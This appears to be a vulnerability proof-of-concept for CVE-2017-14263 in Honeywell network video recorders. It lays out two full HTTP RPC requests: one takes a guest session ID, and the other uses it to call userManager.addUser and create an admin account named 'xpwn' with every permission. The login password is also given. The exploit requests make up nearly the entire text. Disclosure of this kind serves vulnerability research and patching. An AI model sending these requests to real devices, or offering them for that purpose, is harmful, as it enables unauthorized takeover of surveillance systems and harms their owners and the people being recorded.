# Honeywell_NVR_vul

## CVE-2017-14263
## xfuturesec Co., Ltd

### First, obtain the SessionID for a guest user.
We can find the SessionID from any http request. Such as:  
POST https://192.168.1.104/RPC2 HTTP/1.1  
Accept: text/javascript, text/html, application/xml, text/xml  
X-Requested-With: XMLHttpRequest  
X-Request: JSON  
Content-Type: application/x-www-form-urlencoded; charset=utf-8  
Referer: https://192.168.1.104/  
Accept-Language: zh-cn  
Accept-Encoding: gzip, deflate  
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko  
Host: 192.168.1.104  
Content-Length: 84  
DNT: 1  
Connection: Keep-Alive  
Cache-Control: no-cache  
Cookie: DHLangCookie30=%2Fweb_lang%2FEnglish.txt; DhWebSnapPath=C%3A%5CPictureDownload%5C; DhWebRecordPath=C%3A%5CRecordDownload%5C; DhWebClientSessionID=113826814; DhWebCookie=%7B%22username%22%3A%22guest%22%2C%22talktype%22%3A%221%22%2C%22loginid%22%3A633443784%7D

{"method":"global.keepAlive","params":{"timeout": 300},"session":113826814,"id":112}  

"session":113826814 is the SessionID for the current guest user.


### Second, create the admin user.
send the special http request with above mentioned SessionID:
POST https://192.168.1.104/RPC2 HTTP/1.1  
x-requested-with: XMLHttpRequest  
Accept-Language: zh-cn  
Accept: text/javascript, text/html, application/xml, text/xml
Content-Type: application/x-www-form-urlencoded; charset=utf-8  
Accept-Encoding: gzip, deflate  
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)  
Host: 192.168.1.104  
Content-Length: 759  
Connection: Keep-Alive  
Cache-Control: no-cache  
Cookie: DhWebClientSessionID= 113826814

{"method":"userManager.addUser","params":{"user":{"Id":3,"Group":"admin","Name":"xpwn","Password":"DD75DAB01878D84C963128764AB24DD3","Memo":"","Sharable":false,"AuthorityList":["Account","GeneralConf","OutputConfig","TVSet","ComConf","PtzConfig","AutoMaintain","bkConfig","OfflineLoginedUser","DefaultConfig","SysUpdate","MPTZ","Sysinfo","QueryLog","Alarm","Record","Backup","RecordConf","MHardisk","DataFormat","AlarmConf","VideoConfig","NetConf","RemoteDevice","EncodeConf","DelLog","ShutDown","Replay_01","Replay_02","Replay_03","Replay_04","Replay_05","Replay_06","Replay_07","Replay_08","Monitor_01","Monitor_02","Monitor_03","Monitor_04","Monitor_05","Monitor_06","Monitor_07","Monitor_08","Monitor","Replay","CtrPanel"]}},"session": 113826814,"id":271}

"session": 113826814 is the SessionID we get from the first step.


Now, the admin account with name: xpwn and password:Pwd@12345 is created. We can log in to the device with this account.

